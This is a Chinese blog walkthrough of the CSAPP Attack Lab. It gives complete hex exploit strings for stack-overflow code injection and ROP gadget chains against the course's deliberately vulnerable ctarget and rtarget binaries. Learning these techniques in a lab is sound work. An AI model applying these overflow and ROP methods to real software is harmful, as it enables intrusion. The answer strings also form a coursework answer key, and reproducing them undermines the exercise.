---
layout: post
title: Attack Lab解析
excerpt: "CSAPP实验中的一个。栈溢出/代码注入/ROP"
categories: [CS]
comments: true


---



## 介绍

这是[CSAPP](http://csapp.cs.cmu.edu/3e/labs.html)中的第三个实验，和第二个实验Bomb Lab一样是Machine-Level Progamming主题的。完成这次实验所需要的知识不超乎于汇编语言指令、栈、寄存器，在[Bomb Lab](https://two2er.github.io/articles/2020-02/bomblab)中都有提及。

这次实验中的几个任务，都要求输入一个字符串。程序调用以下读取函数来读取字符串：

```c
unsigned getbuf() {
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

读取完字符串后，程序将字符串写入栈上，即`buf`数组中。你可以做的事包括通过字符串完成栈溢出，使得读取函数的返回地址被覆盖，等等，来达到一些目的。实验分两个Part，第一个Part的栈地址不会改变、允许执行栈上代码，难度比Part 2简单。Part 2无法用注入代码来完成，需要更多的技巧。

## Part 1: Part I: Code Injection Attacks

### Level 1

Level 1调用`test`函数来读取一个字符串：

```c
void test() {
	int val;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

如果打印了`"No exploit..."`，说明什么异常也没发生，这不是我们想要的；实验希望我们能输入一个字符串，覆盖`getbuf`函数的返回地址，使其不回到`test`函数体中而是运行函数`touch1`。从CSAPP书上可以知道，`caller`调用一个函数`callee`后，会将返回地址写入栈，然后再将控制权传给`callee`。而返回地址就写在起始栈顶`%rsp`上。我们通过将`ctarget`文件反汇编，可以看到`getbuf`函数：

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
```

分配了`0x28=40`字节的空间，读取字符串，然后返回1。因此，字符串目标数组`buf`的长度就是40个字节。由于X86-64上的内存地址为8字节，所以我们需要输入一个48字节的字符串。其中40个是为了填充`buf`，剩下8个则是为了覆盖返回地址。填充`buf`的字符是什么都行（除了`\n`）。注意栈是向低地址扩展的，`*buf`这个字符（即字符串中最左的字符）放在最低的地址中。所以字符串从左到右，应该是40个填充的字符，然后是`touch1`的返回地址。从汇编文件中，可以看到`touch1`地址为`00000000004017c0`。同时，因为Intel机器是小端，地址的低位存放在低地址。下面是一个覆盖后的（抽象的）示意图：

> 栈地址    ： (%rsp+8) (%rsp+7) ... (%rsp+1) (%rsp)
>
> 返回地址： 00                00            ...  17             c0

因此，输入的字符串从第41个字符起，应该是`c0 17 40 00 00 00 00 00`。把这个长度为48的字符串输入`ctarget`，就能破解Level 1。下面是一个可能的答案：

```assembly
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00
```



### Level 2

Level 2要求跳转到`touch2`函数后，让参数`val`的值和`cookie`的值相等。在`touch2`处断点调试，可以查看到`cookie`的值和`cookie.txt`中的十六进制数`0x59b997fa`是一样的。但是`val`的值（以及`%rdi`）的值和`cookie`并不相等，所以我们要么改`val`(`%rdi`)要么改`cookie`……`cookie`是不会变的，即使修改了`cookie.txt`文件（谁叫我考不上CMU，只能加参数`-q`……），所以要通过注入代码修改`val`。注入的代码应该是这样的：

```assembly
mov $0x59b997fa, %rdi
pushq $0x4017ec					# touch2的地址
retq
```

先修改`%rdi`值，然后返回到`touch2`函数去。为了获取这段汇编代码的对应机器码，可以保存为文件，再：

```bash
unix> gcc -c example.s
unix> objdump -d example.o > example.d
```

机器码如下：

```assembly
48 c7 c7 fa 97 b9 59
68 ec 17 40 00
c3
```

为了运行这段注入代码，我们要覆盖`getbuf`的返回地址为这段代码的地址。它的地址即为栈顶指针的内存地址。我们通过函数地址给`getbuf`打断点，可以查看到`%rsp`值为`0x5561dca0`，它减去`0x28`后为`0x5561dc78`，这就是注入代码的地址。注入代码的内容写在`buf`里，将`buf`填充至40字节使栈溢出，然后用注入代码地址覆盖`getbuf`原返回地址。最终答案如下：

```assembly
48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00
```

PS：非得用`jmp`或者`callq`来跳转到注入代码位置也是可以的，但是把汇编代码翻译成机器码比较麻烦。

PS2：没有进行stack randomization的前提下，程序每次运行时栈地址好像是相同的。即使是不同机器，只要OS和程序相同，栈地址也很可能是相同的。这样增加了代码注入的隐患。stack randomization在程序运行前在栈上分配随机大小的空间，使得程序使用的栈地址也随机。针对stack randomization的方法有注入所谓的nop sled，即在注入代码前增加一大串nop。如果覆盖的返回地址跳转到某个nop上，它会持续跑完这段nop序列，最后到达注入代码。这种做法大大提高了跳转的命中率。不过stack randomization在64位机上的随机范围好像有2^32，所以也是很难命中的。（摘自CSAPP）

### Level 3

Level 3是Level 2的延伸，它要求输入给`touch3`一个字符串，然后让这个字符串和`cookie`通过以下函数比较：

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval) {
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    // s为val的二进制表示，保留8位
    sprintf(s, "%.8x", val);
    // sval和s的前至多9位是否相同
    return strncmp(sval, s, 9) == 0;
}
```

Level 3的解法和Level 2类似，不过要求把一个字符串写在栈上，传给寄存器`%rdi`的只是字符串的地址。把该字符串`sval`放在栈哪里要注意。在`getbuf`返回后，栈顶指针`%rsp`指向返回地址，PC指针跳转到注入代码处，运行注入代码，把`touch3`地址`push`到栈上，然后`retq`读取出该地址，将PC指针跳转到`touch3`代码那里。这个过程中`%rsp`随`pushq`减少，然后又随`retq`增加，最终没有变化，还是在`getbuf`返回地址那。接下来运行`touch3`，`haxmatch`分配110字节给`cbuf`，涵盖了`getbuf`里面给`buf`的所有空间。`hexmatch`还随机定`s`的首地址，让`sprintf`写入的字符串随机出现在这段空间上，可能会把`buf`原有内容覆盖掉。为了安全传值，我们不能把`sval`字符串的内容写在`buf`范围内，不然可能会被`s`覆盖。我们可以把它写在`getbuf`返回地址更高位的地方，这样`hexmatch`是无法变动`sval`字符串的。因此，如同Level 2，注入代码还是这个样子：

```assembly
mov $0x5561dca8, %rdi			# %rsp+8，越过了返回地址，作为sval字符串首地址
pushq $0x4018fa					# touch3的地址
retq
```

整个输入字符串如下：

```assembly
48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3		# 注入代码
# 填充buf到40个字符
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
# 注入代码的地址。和Level 2一样
78 dc 61 55 00 00 00 00
# sval的值。它应该和cookie（转换成字符串后）一样
35 39 62 39 39 37 66 61 00
```

在理解Level 2后，做Level 3不是很难。

## Part II: Return-Oriented Programming

### Level 2

`rtarget`和`ctarget`不同，它使用了stack randomization随机化栈地址，还让栈空间上不可执行代码（无法执行`buf`内注入代码）。对`rtarget`进行攻击的方式是return-oriented programming (ROP)。它在已有指令上找出多个小块，称为gadget。每个gadget末尾是一个`ret`指令，会让程序跳转到下一个gadget。gadget不一定要包括原有指令中完整的一行，比如以下函数：

```assembly
0000000000400f15 <setval_210>:
400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)
400f1b: c3 retq
```

前面3个字节不要（即`c7 07 d4`），从第四个字节开始作为一个gadget。`48 89 c7`是`movq %rax, %rdi`的机器码，通过截取原有指令编码可以让攻击者完成更多攻击行为（酷炫啊(p≧w≦q)）。

Part 2 Level 2要完成的任务和Part 1 Level 2是一样的，只是需要用ROP解决。需要做的事还是那么两件：

- 把`%rdi`值设为`cookie`值，即`0x59b997fa`。
- 跳转到`touch2`函数，地址为`0x4017ec`。

一开始我的设想是让`getbuf`栈溢出，覆盖返回地址为某个包含有

```assembly
popq %rdi
retq
```

编码的地方。把`cookie`值写入栈上返回地址后面，通过`popq`操作将其弹入`%rdi`中。但是在`farm.c`部分没有找到`popq %rdi`对应的编码`0x5f`，只能先`popq`到另一个寄存器，再将寄存器值移入`%rdi`中。经过查找，我发现`addval_219`处有一段`58 90 c3`，翻译过来就是

```assembly
popq %rax
nop
retq
```

同时，在`addval_273`上有另一个段编码`48 89 c7 c3`，即

```assembly
movq %rax, %rdi
retq
```

刚好让`%rdi`被间接赋值为`cookie`值。因此，输入的字符串应为：

```assembly
# 填充buf，40个字符
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
# 跳转到addval_219的58 90 c3部分
ab 19 40 00 00 00 00 00
# cookie值，供popq
fa 97 b9 59 00 00 00 00
# 跳转到addval_273的48 89 c7 c3部分
a2 19 40 00 00 00 00 00
# 跳转到touch2
ec 17 40 00 00 00 00 00
```

### Level 3

这题看得我眼花……`sval`和Part 1 Level 3一样，需要保存在所有返回地址的后面。由于`rtarget`每次运行的栈地址不固定，所以只能取当前`%rsp`值，然后根据输入字符串的长度，计算`sval`存放的位置。在`farm.c`里面有一个`add_xy`函数，可以将`%rdi`和`%rsi`加起来，结果保存在`%rax`里。这个函数可以用来计算`sval`位置。在那之前，我们需要将`%rdi`和`%rsi`分别赋值为`%rsp`值和偏移值。偏移值只有在知道了整个输入字符串以后才能知道，所以先不管……

首先我们把`%rdi`设为`%rsp`值，即当前栈顶位置。在`40 1a 06`位置有一串`movq %rsp, %rax`，在`40 19 a2`位置有一串`movq %rax, %rdi`。通过这两个指令，间接地完成赋值。然后是给`%rsi`赋值。先假设偏移值为`x`吧。

偏移值我们可以通过`popq`输入。在`40 19 ab`处有一段`popq %rax`，我们可以把偏移值计算好后放到`40 19 ab`后边，完成偏移值的输入。然后在`40 19 dd`处有一段`movl %eax, %edx`，在`40 1a 34`处有一段`movl %edx, %ecx`，在`40 1a 13`处有一段`movl %ecx, %esi`，非常艰难地将`%eax`值移到了`%esi`……其实在进行这些赋值时我是非常纠结的。因为只是给`%esi`赋了值，`%rsi`的高32位并没有赋值，值不确定。但是前面提到的加法操作是用了这个64位的`%rsi`……所以可能会发生一些意想不到的事。不过我运气好，或者因为其他我不知道的原因，我没有碰到高32位和实际不同的情况。但这不意味着我的做法是严谨的。如果我能想出其他更好的方法，我也不会这么做的……

完成了`%rdi`和`%rsi`的赋值后，将它们相加，保存在`%rax`中，就是`sval`的地址了。然后将`%rax`传给`%rdi`，作为第一参数调用`touch3`，便可通过测试。数一下从将`%rsp`值传给`%rax`开始，直到`sval`首地址，总共返回了7个gadget，加上偏移值（8字节），和`touch3`返回地址（8字节），共`8 * 9 = 72 = 0x48`字节。因此，偏移值是`0x48`。综上，输入字符串应该如下：

```assembly
# 填充buf，40个字节
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
# movq %rsp, %rax
06 1a 40 00 00 00 00 00
# movq %rax, %rdi
a2 19 40 00 00 00 00 00
# popq %rax
ab 19 40 00 00 00 00 00
# 偏移值
48 00 00 00 00 00 00 00
# movl %eax, %edx
dd 19 40 00 00 00 00 00
# movl %edx, %ecx
34 1a 40 00 00 00 00 00
# movl %ecx, %esi
13 1a 40 00 00 00 00 00
# add_xy
d6 19 40 00 00 00 00 00
# movq %rax, %rdi
a2 19 40 00 00 00 00 00
# touch3
fa 18 40 00 00 00 00 00
# sval的值。它应该和cookie（转换成字符串后）一样
35 39 62 39 39 37 66 61 00
```

我的方法使用了8个gadget，和official solution提到的一样(\*^▽^\*)。不过，我在网上搜索到了[另一种做法](https://blog.csdn.net/lijun538/article/details/50682387)，它使用了一个实验文档没有提到的指令`add $0x37, %al`，给`%rax`（已经提前将`%rsp`值移入）加上了`0x37`。`0x37`就算是偏移值，无需计算。最后，给输入字符串填充无用字符，使得`%rsp+0x37`的地方是`sval`的首地址即可。这种方法只需要3个gadget，而且比我的做法靠谱（能保证最后传给`touch3`的`sval`地址的高32位没有错），所以是一种好得多的方法。

## 总结

这次的Lab要远比Bomb Lab简单……花的时间少一半吧。跟Bomb Lab一样，这次实验的设置也非常酷炫。虽然我知道这些攻击技术在当代已经几乎不起作用了，但还是觉得很牛逼呀(p≧w≦q)。这次实验让我对栈指针和PC指针关系的理解加深了很多。说实话，上了好多年的课，我对stack overflow的理解还停留在数组越界上（可能这就是我为什么那么菜的原因吧……）。CSAPP教的东西真的很实用。尽管我以后基本不会碰汇编代码和机器码（debug得我想哭），但它们对提高C/C++程序员修养非常有帮助。